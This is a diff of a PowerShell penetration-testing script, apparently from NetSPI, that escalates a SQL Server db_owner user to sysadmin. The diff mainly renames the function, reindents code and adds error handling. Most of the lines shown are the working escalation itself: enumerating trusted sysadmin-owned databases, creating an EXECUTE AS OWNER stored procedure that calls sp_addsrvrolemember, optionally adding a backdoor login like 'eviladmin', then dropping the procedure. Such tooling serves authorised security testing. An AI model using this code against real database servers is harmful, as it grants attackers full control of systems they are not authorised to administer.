@@ -1,4 +1,4 @@
-function Invoke-mssql_escalate_dbowner
+function Invoke-MssqlEscalateDbowner
 {
     <#
 	.SYNOPSIS
@@ -12,7 +12,7 @@ function Invoke-mssql_escalate_dbowner
 	.EXAMPLE
 	   Getting sysadmin as a user that has the db_owner role in a trusted database owned by a sysadmin.
 
-	   PS C:\> Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS
+	   PS C:\> Invoke-MssqlEscalateDbowner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS
 	   [*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...
 	   [*] Connected.
 	   [*] Enumerating accessible trusted databases owned by sysadmins...
@@ -25,7 +25,7 @@ function Invoke-mssql_escalate_dbowner
 
 	.EXAMPLE
 	   Creating new sysadmin, using a user that has the db_owner role in a trusted database owned by a sysadmin.
-	   PS C:\> Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS -newuser eviladmin -newPass MyPassword!
+	   PS C:\> Invoke-MssqlEscalateDbowner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS -newuser eviladmin -newPass MyPassword!
 	   [*] Attempting to Connect to SQLServer1\SQLEXPRESS as myappuser...
 	   [*] Connected.
 	   [*] Enumerating accessible trusted databases owned by sysadmins...
@@ -41,7 +41,7 @@ function Invoke-mssql_escalate_dbowner
 
 	.NOTES
 	   Author: Scott Sutherland - 2014, NetSPI
-	   Version: Invoke-SqlServerDbElevateDbOwner v1.0
+	   Version: Invoke-MssqlEscalateDbowner v1.0
 	   Comments: Should work on SQL Server 2005 and Above.
     #>
 
@@ -174,10 +174,10 @@ function Invoke-mssql_escalate_dbowner
         write-host "[*] Checking if $ConnectUser the has db_owner role in any of them..."
 	    $TableDatabases | foreach {
 
-		    [string]$CurrentDatabase = $_.databasename                    
+		[string]$CurrentDatabase = $_.databasename                    
 		
-		    # Setup query to grab a list of databases
-		    $QueryProcedures = "use $CurrentDatabase;select db_name() as db,rp.name as database_role, mp.name as database_user
+		# Setup query to grab a list of databases
+		$QueryProcedures = "use $CurrentDatabase;select db_name() as db,rp.name as database_role, mp.name as database_user
 	        from [$CurrentDatabase].sys.database_role_members drm
 	        join [$CurrentDatabase].sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
 	        join [$CurrentDatabase].sys.database_principals mp on (drm.member_principal_id = mp.principal_id) 
@@ -185,8 +185,11 @@ function Invoke-mssql_escalate_dbowner
 
 		    # Query the databases and load the results into the TableDatabase data table object
 		    $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryProcedures,$conn)
-		    $results2 = $cmd.ExecuteReader()
-		    $TableDBOwner.Load($results2)  
+		    Try{
+		    	$results2 = $cmd.ExecuteReader()
+		    	$TableDBOwner.Load($results2)
+		    }
+		    Catch {}
        		
 	    }
     }
@@ -238,7 +241,7 @@ function Invoke-mssql_escalate_dbowner
        
         }
 
-		# Create stored procedures to escalate privileges
+	# Create stored procedures to escalate privileges
         $conn.Open()
         $QueryElevate = "CREATE PROCEDURE sp_elevate_me
         WITH EXECUTE AS OWNER
@@ -247,30 +250,30 @@ function Invoke-mssql_escalate_dbowner
         $AddUser
         EXEC sp_addsrvrolemember '$UsertoElevate','sysadmin'
         end"
-		$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
-		$results = $cmd.ExecuteReader() 
+	$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+	$results = $cmd.ExecuteReader() 
         $conn.Close()         
 
-		# Execute stored procedures to escalate privileges
+	# Execute stored procedures to escalate privileges
         $conn.Open()
         $QueryElevate = "EXEC sp_elevate_me"
-		$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
-		$results = $cmd.ExecuteReader() 
+	$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+	$results = $cmd.ExecuteReader() 
         $conn.Close() 
 
-		# Remove stored procedure
+	# Remove stored procedure
         $conn.Open()
         $QueryElevate = "drop proc sp_elevate_me"
-		$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
-		$results = $cmd.ExecuteReader() 
+	$cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+	$results = $cmd.ExecuteReader() 
         $conn.Close() 
 
-		# Verify that privilege escalation works
+	# Verify that privilege escalation works
         If (-Not ($newuser -and $newPass)){
             $conn.Open()
             $QueryElevate = "select is_srvrolemember('sysadmin') as IsSysAdmin"
-		    $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
-		    $results = $cmd.ExecuteReader() 
+            $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryElevate,$conn)
+            $results = $cmd.ExecuteReader() 
             $CheckforSysadmin.Load($results) 
             $conn.Close() 
 
